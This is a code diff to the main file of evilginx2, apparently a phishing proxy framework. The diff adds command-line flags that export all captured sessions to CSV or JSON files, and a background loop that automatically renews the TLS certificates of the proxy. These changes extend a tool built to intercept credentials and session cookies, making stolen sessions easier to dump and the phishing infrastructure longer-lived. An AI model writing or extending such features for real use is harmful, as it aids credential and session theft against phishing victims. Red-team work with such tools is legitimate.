@@ -8,6 +8,7 @@ import (
 	"os/user"
 	"path/filepath"
 	"regexp"
+	"time"
 
 	"github.com/caddyserver/certmagic"
 	"github.com/kgretzky/evilginx2/core"
@@ -24,6 +25,9 @@ var debug_log = flag.Bool("debug", false, "Enable debug output")
 var developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
 var cfg_dir = flag.String("c", "", "Configuration directory path")
 var version_flag = flag.Bool("v", false, "Show version")
+var export_csv = flag.Bool("export-csv", false, "Export all captured sessions to CSV file (with timestamp) and exit")
+var export_json = flag.Bool("export-json", false, "Export all captured sessions to JSON file (with timestamp) and exit")
+var cert_renewal_check = flag.Int("cert-renewal-check", 24, "Certificate renewal check interval in hours (default: 24)")
 
 func joinPath(base_path string, rel_path string) string {
 	var ret string
@@ -138,6 +142,25 @@ func main() {
 		return
 	}
 
+	if *export_csv {
+		filename, err := db.ExportSessionsCSV("")
+		if err != nil {
+			log.Fatal("export CSV failed: %v", err)
+			return
+		}
+		log.Success("sessions exported to CSV: %s", filename)
+		return
+	}
+	if *export_json {
+		filename, err := db.ExportSessionsJSON("")
+		if err != nil {
+			log.Fatal("export JSON failed: %v", err)
+			return
+		}
+		log.Success("sessions exported to JSON: %s", filename)
+		return
+	}
+
 	bl, err := core.NewBlacklist(filepath.Join(*cfg_dir, "blacklist.txt"))
 	if err != nil {
 		log.Error("blacklist: %s", err)
@@ -177,6 +200,26 @@ func main() {
 	if err != nil {
 		log.Fatal("certdb: %v", err)
 		return
+	}
+
+	crc := cfg.GetCertRenewalConfig()
+	crc.CheckInterval = *cert_renewal_check
+	cfg.SetCertRenewalConfig(crc)
+	if crc.Enabled && !*developer_mode {
+		go func() {
+			time.Sleep(30 * time.Second)
+			for {
+				if err := crt_db.CheckAndRenewCertificates(); err != nil {
+					log.Error("certificate renewal error: %v", err)
+				}
+				intervalH := cfg.GetCertRenewalConfig().CheckInterval
+				if intervalH <= 0 {
+					intervalH = 24
+				}
+				time.Sleep(time.Duration(intervalH) * time.Hour)
+			}
+		}()
+		log.Info("automatic certificate renewal enabled (check every %d hours)", *cert_renewal_check)
 	}
 
 	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode)
